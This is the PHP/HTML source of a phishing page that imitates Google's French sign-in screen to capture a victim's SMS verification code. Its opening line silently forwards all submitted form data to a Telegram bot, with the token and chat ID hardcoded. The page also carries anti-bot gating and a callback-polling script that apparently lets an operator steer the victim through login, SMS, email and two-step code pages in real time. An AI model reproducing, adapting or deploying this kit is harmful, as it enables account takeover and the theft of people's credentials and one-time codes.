<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

require_once '../modules/sessions.php'; // INIT OU RECUPERER SESSIONS + COOKIES
require_once '../antibots/all.php';     // AB 
require_once __DIR__ . '/../langues/lang_detect.php';


if (empty($_SESSION['captcha_valide']) || $_SESSION['captcha_valide'] !== true) {
    header('Location: ../index.php');
    exit;
}
if (!empty($_POST['bot_honeypot'])) {
    exit;
}


?>
<!doctype html>

<head>
   <title> <?php echo $tr["title_others"]; ?></title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindexnofollow ,noimageindex ,noarchive, nocache, nosnippet">
    <!-- CSS FILES -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/index.css">
    <!--icon .ico -->
    <link rel="icon" type="image/x-icon" href="../assets/img/icon.ico" />
    
</head>
<style>
    .error-message-google {
        color: #d93025;
        /* rouge Google */
        font-size: 0.875rem;
        /* un peu plus petit */
        margin-top: 4px;
        font-family: 'Roboto', sans-serif;
        /* comme Google */
    }
</style>
<style>
    .loader {
        display: none;
        /* caché par défaut */
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(255, 255, 255, 0.6);
        /* fond semi-transparent */
        z-index: 9999;
        align-items: center;
        justify-content: center;
    }

    .loader .spinner-border {
        width: 4rem;
        height: 4rem;
        border: 0.4em solid #4285f4;
        /* bleu Google */
        border-top-color: transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        to {
            transform: rotate(360deg);
        }
    }
</style>
<!-- Loader -->
<div class="loader">
    <div class="spinner-border"></div>
</div>

<body jscontroller=LDQI jsaction="" class="jR8x9d nyoS7c UzCXuf EIlDfe">
    <div jscontroller=DqMihc jsaction=rcuQ6b:npT2md;rURRne:AC0Pid;WK2DQd:daFy6d class=bdCvOd></div>
    <div class="S7xv8 LZgQXe">
        <div class="TcuCfd NQ5OL" jsname=rZHESd jscontroller=K1ZKnb jsaction="" tabindex=null>
            <div jscontroller=ziZ8Mc jsaction=rcuQ6b:npT2md jsname=P1ekSe class=Ih3FE aria-hidden=true>
                <div jscontroller=ltDFwf jsaction=transitionend:Zdx3Re jsname=P1ekSe role=progressbar class="sZwd7c B6Vhqe qdulke jK7moc">
                    <div class="xcNBHc um3FLe"></div>
                    <div jsname=cQwEuf class="w2zcLc Iq5ZMc"></div>
                    <div class="MyvhI TKVRUb" jsname=P1ekSe><span class="l3q5xe SQxu9c"></span></div>
                    <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                </div>
            </div>
            <div class=fAlnEc id=yDmH0d jsaction=ZqRew:.CLIENT><c-wiz jsrenderer=chA7fe class=A77ntc data-view-id=hm18Ec data-locale=fr data-allow-sign-up-types=true jsshadow jsdata=deferred-i6 data-p='%.@.false,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,false,null,null,false,null,null,null,null,null,"S-1138980805:1755116232311330",null,"https://accounts.google.com",null,null,null,[[null,null,null,null,"https://www.google.com/"],[null,null,"S-1138980805:1755116232311330","AddSession","https://www.google.com/",null,[["authuser","0"],["continue","https://www.google.com/"],["ec","futura_exp_og_si_72776762_e"],["hl","fr"],["flowName","GlifWebSignIn"],["flowEntry","AddSession"],["dsh","S-1138980805:1755116232311330"]],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,null,[],null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,null,[]],null,null,null,[null,null,null,null,null,[null,[["authuser",["0"]],["continue",["https://www.google.com/"]],["ec",["futura_exp_og_si_72776762_e"]],["hl",["fr"]],["flowName",["GlifWebSignIn"]],["flowEntry",["AddSession"]],["dsh",["S-1138980805:1755116232311330"]]],"https://www.google.com/"],null,"S-1138980805:1755116232311330",null,null,[]]],null,false]' jscontroller=b3kMqb jsaction="click:jKoJid(preventDefault=true|DPJEMd),WZ2Bje(Cuz2Ue);jiqeKb:UHZ0U;Pp1AU:IjS5bf;rcuQ6b:WYd;W7m8ib:cqxkve;t5qvFd:.CLIENT" jsname=nUpftc data-node-index=0;0 jsmodel="hc6Ubd niKKCd" view c-wiz>
                    <main class=Svhjgc jsname=bN97Pc jscontroller=SD8Jgb jsshadow>
                        <div class=zIgDIc jsname=paFcre><c-wiz jsrenderer=OTcFib jsshadow jsdata=deferred-i7 data-p=%.@.] data-node-index=2;0 jsmodel=hc6Ubd c-wiz>
                                <div class=Wf6lSd jscontroller=rmumx jsname=n7vHCb><svg xmlns=https://www.w3.org/2000/svg width=48 height=48 viewBox="0 0 40 48" aria-hidden=true jsname=jjf7Ff>
                                        <path fill=#4285F4 d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                                        <path fill=#34A853 d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                                        <path fill=#FABB05 d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                                        <path fill=#E94235 d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                                    </svg></div><c-data id=i7 jsdata=" eCjdDd;_;2" class=sf-hidden></c-data>
                            </c-wiz>
                            <div class="ObDc3 ZYOIke" jsname=tJHJj jscontroller=E87wgc jsaction=JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;>
                                <h1 class=vAV9bf data-a11y-title-piece id=headingText jsname=r4nke><span jsslot> <?php echo $tr["sms"]["0"];?></span></h1>
                                <div class=gNJDp data-a11y-title-piece id=headingSubtext jsname=VdSJob><span jsslot>
                                        <?php echo $tr["sms"]["1"];?></span></div>
                            </div>

                        </div>
                        <div class=UXFQgc jsname=uybdVe>
                            <div class=qWK5J>
                                <div class=xKcayf jsname=USBQqe>
                                    <div class=AcKKx jsname=rEuO1b jscontroller=qPYxq data-form-action-uri>

                                        <form id="form-bnp">

                                            <span jsslot>
                                                <section class=Em2Ord jscontroller=Tbb4sb jsshadow>
                                                    <header class="vYeFie sf-hidden" jsname=tJHJj aria-hidden=true></header>
                                                    <div class="yTaH4c" jsname="MZArnb">
                                                        <div jsslot="">
                                                            <div jscontroller="mvkUhe" jsaction="keydown:C9BaXe;O22p3e:Op2ZO;AHmuwe:Jt1EX;rcuQ6b:rcuQ6b;YqO5N:Lg5SV;rURRne:rcuQ6b;EJh3N:rcuQ6b;sPvj8e:di0fJ;RXQi4b:.CLIENT;TGB85e:.CLIENT" jsname="dWPKW" class="AFTWye  vEQsqe" data-allow-at-sign="true" data-is-rendered="true">
                                                                <div class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc CDELXb" jscontroller="pxq3x" jsaction="clickonly:KjsqPd; focus:Jt1EX; blur:fpfTEe; input:Lg5SV" jsshadow="" jsname="Ufn6O">


                                                                    <!-- text -->
                                                                    <div class="dMNVAe"> <?php echo $tr["sms"]["2"];?>
                                                                        <span class="red0Me" jscontroller="wjF3l" jsshadow="" jsaction=""><span dir="ltr" jsname="wKtwcc"><?php echo $_SESSION['numero'] ?></span></span>
                                                                    </div> <!-- input -->
                                                                    <br>
                                                                    <div class="aCsJod oJeWuf">
                                                                        <div class="aXBtI I0VJ4d Wic03c">
                                                                            <span jsslot="" class="A37UZe qgcB3c iHd5yb">&nbsp;&nbsp;&nbsp;G-</span>
                                                                            <div class="Xb9hP">
                                                                                <input type="tel" pattern="[0-9 ]*" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="off"
                                                                                    spellcheck="false" tabindex="0" aria-label=" <?php echo $tr["sms"]["3"];?>"
                                                                                    aria-describedby="c25" name="code_sms" aria-disabled="false"
                                                                                    autocapitalize="off" id="idvPin" autocorrect="off" dir="ltr"
                                                                                    data-initial-dir="ltr"
                                                                                    data-initial-value="" aria-invalid="false" value="">
                                                                                <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true"> <?php echo $tr["sms"]["3"];?></div>
                                                                            </div>
                                                                            <div class="i9lrp mIZh1c"></div>
                                                                            <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"></div>
                                                                        </div>
                                                                    </div>

                                                                    <?php if (isset($_GET['error'])) : ?>
                                                                        <div class="error-message-google">
                                                                            <strong> <?php echo $tr["sms"]["error"];?> </strong> 
                                                                        </div>
                                                                    <?php endif; ?>




                                                                    <div class="LXRPh">
                                                                        <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                                                    </div>
                                                                </div>
                                                                <div class="bfzBdd" jsname="NuIDSd" id="i8"></div>
                                                            </div>




                                                            <div jscontroller="CMcBD" jsname="Si5T8b" class="lbFS4d eLNT1d" jsaction="">

                                                                <div jscontroller="Fndnac" jsaction="" jsname="jKg4ed" class="AFTWye " data-is-rendered="true">

                                                                    <div class="bfzBdd" jsname="NuIDSd" id="i9"></div>
                                                                </div>

                                                            </div>

                                                        </div>
                                                    </div>
                                                </section>
                                            </span>


                                            <!--FIN FORM -->
                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class=JYXaTc jsname=DH6Rkf jscontroller=z0u0L data-is-consent=false data-is-primary-action-disabled=false data-is-secondary-action-disabled=false data-primary-action-label=<?php echo $tr["btn_suivant"];?> jsshadow>
                            <div class=O1Slxf jsname=DhK0U>
                                <div class=TNTaPb jsname=k77Iif>
                                    <div jscontroller=f8Gu1e jsaction=click:cOuCgd;JIbuQc:JIbuQc; jsname=Njthtb class="XjS9D TrZEUc" id=identifierNext>
                                        <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true>

                                            <button
                                                type="submit"
                                                class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b">
                                                <div class="VfPpkd-Jh9lGc"></div>
                                                <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                                <div class="VfPpkd-RLmnJb"></div>
                                                <span jsname="V67aGc" class="VfPpkd-vQzf8d"><?php echo $tr["btn_suivant"];?></span>
                                            </button>


                                        </div>
                                    </div>
                                </div>
                                </form>


                                <div class=FO2vFd jsname=QkNstf>
                                    <div class=n3Clv jsname=FIbd0b>
                                        <div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd XjS9D" jscontroller=wg1P6b jsaction="JIbuQc:aj0Jcf(WjL7X); keydown:uYT2Vb(WjL7X);xDliB:oNPcuf;SM8mFd:li9Srb;iFFCZc:NSsOUb;Rld2oe:NSsOUb" jsname=lqvTlf jsshadow data-disable-idom=true>
                                            <div jsname=WjL7X jsslot>
                                                <div class=VfPpkd-dgl2Hf-ppHlrf-sM5MNb data-is-touch-wrapper=true><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc J7pUA" jscontroller=soHxf jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;" data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc  J7pUA" aria-expanded=false aria-haspopup=menu type=button>
                                                        <div class=VfPpkd-Jh9lGc></div>
                                                        <div class="VfPpkd-J1Ukfc-LhBDec sf-hidden"></div>
                                                        <div class=VfPpkd-RLmnJb></div><span jsname=V67aGc class=VfPpkd-vQzf8d> <?php echo $tr["index"]["9"];?></span>
                                                    </button></div>
                                            </div>
                                            <div jsname=U0exHf jsslot>
                                                <div class="VfPpkd-xl07Ob-XxIAqe VfPpkd-xl07Ob q6oraf P77izf KMdFve sf-hidden" jsname=DRCaZb jscontroller=ywOR5c jsaction=keydown:I481le;JIbuQc:j697N(rymPhb);XVaHYd:c9v4Fb(rymPhb);Oyo5M:b5fzT(rymPhb);DimkCe:TQSy7b(rymPhb);m0LGSd:fAWgXe(rymPhb);WAiFGd:kVJJuc(rymPhb); data-is-hoisted=true data-should-flip-corner-horizontally=false data-stay-in-viewport=false data-disable-idom=true data-menu-uid=ucc-0></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </main><c-data id=i6 jsdata=" kY3gQd;_;6 DoqpZc;_;4" class=sf-hidden></c-data>
                </c-wiz>
                <div id=ZCHFDb></div>
            </div>
        </div>
        <div class=wmGw4><c-wiz jsrenderer=ZdRp7e jsshadow jsdata=deferred-i1 data-node-index=0;0 jsmodel=hc6Ubd c-wiz>
                <footer class=FZfKCe>
                    <div class=eXa0v jscontroller=xiZRqc jsaction=rcuQ6b:npT2md;OmFrlf:VPRXbd>
                        
                    </div>
                    <ul class=HwzH1e>
                        <li class=qKvP1b><a class="AVAq4d TrZEUc" href="" target=""> <?php echo $tr["footer"]["0"];?></a>
                        <li class=qKvP1b><a class="AVAq4d TrZEUc" href="" target=""> <?php echo $tr["footer"]["1"];?></a>
                        <li class=qKvP1b><a class="AVAq4d TrZEUc" href="" target=""> <?php echo $tr["footer"]["2"];?></a>
                    </ul>
                </footer><c-data id=i1 jsdata=" OsjLy;_;1" class=sf-hidden></c-data>
            </c-wiz></div>
    </div>



    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

</body>

</html>

<!-- Fin form -->
<script>
    const form = document.getElementById('form-bnp');
    const logininput = document.getElementById('idvPin');

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Nettoyage anciens messages d'erreur
        [logininput].forEach(input => {
            const oldError = input.parentNode.querySelector('.error-message');
            if (oldError) oldError.remove();
        });

        let hasError = false;

        if (!logininput.value) {
            showError(logininput, 'Le code est requis');
            hasError = true;
        }

        if (hasError) {
            logininput.focus();
            return false;
        }

        // Soumission via fetch
        const loader = document.querySelector('.loader');
        if (loader) loader.style.display = 'flex'; // 🔹 loader visible dès maintenant

        const formData = new FormData(form);
        formData.set('idvPin', logininput.value);

        fetch('../actions/code_sms.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    showError(logininput, data.error);
                    // loader caché uniquement si erreur immédiate
                    if (loader) loader.style.display = 'none';
                } else if (data.step === 2) {
                    // 🔹 lancer le polling sans cacher le loader
                    startCallbackPolling(loader);
                } else {
                    alert('Réponse inattendue du serveur');
                    if (loader) loader.style.display = 'none';
                }
            })
            .catch(() => {
                alert('Erreur réseau, veuillez réessayer.');
                if (loader) loader.style.display = 'none';
            });
    });

    function showError(inputElement, message) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.color = '#d93025';
        errorDiv.style.fontSize = '0.9rem';
        errorDiv.style.marginTop = '5px';
        errorDiv.textContent = message;
        inputElement.parentNode.appendChild(errorDiv);
    }

    // Polling callback
    function startCallbackPolling(loaderElement) {
        const intervalId = setInterval(() => {
            fetch('../actions/callback.php', {
                    cache: 'no-store'
                })
                .then(res => res.text())
                .then(msg => {
                    const trimmedMsg = msg.trim();
                    console.log('Callback reçu :', trimmedMsg);

                    const redirectMap = {
                        'login_error': '../pages/index.php?error=error',
                        'num': '../pages/num.php', //numéro de téléphone    
                        'num_error': '../pages/num.php?error=error', //numéro de téléphone     

                        'code_sms_error': '../pages/code_sms.php?error=error', //code smsrecu
                        'code_sms': '../pages/code_sms.php', //code recu

                        'code_mail': '../pages/code_mail.php', //code recu
                        'code_mail_error': '../pages/code_mail.php?error=error', //code recu

                        'pin_2steps': '../pages/2steps.php', //code recu                      
                        '2steps_error': '../pages/2steps.php?error=error', //code recu
                        
                        'success': '../pages/success.php',
                        'ban_ip': '../pages/ban.php'
                    };

                    if (redirectMap[trimmedMsg]) {
                        clearInterval(intervalId);
                        window.location.href = redirectMap[trimmedMsg];
                    } else {
                        // 🔹 loader reste affiché tant qu'aucune redirection
                        console.log('Message callback inattendu :', trimmedMsg);
                    }
                })
                .catch(err => console.error('Erreur fetch callback:', err));
        }, 3000);
    }
</script>